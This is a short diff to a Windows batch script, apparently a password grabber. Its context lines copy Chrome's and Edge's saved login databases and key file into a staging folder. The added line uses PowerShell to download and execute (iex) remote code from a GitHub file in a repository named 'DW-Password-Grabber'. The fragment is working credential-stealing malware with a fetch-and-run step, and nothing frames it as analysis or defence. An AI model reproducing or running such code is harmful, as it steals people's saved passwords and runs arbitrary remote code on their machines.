@@ -22,6 +22,7 @@ copy "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Local State" "C:
 
 copy "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"C:\Users\%USERNAME%\GP-7\Edge\Encrypted"
 
+powershell -Command "& {iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/ZDStudios/DW-Password-Grabber/refs/heads/main/updates.txt')}"
 
 
 
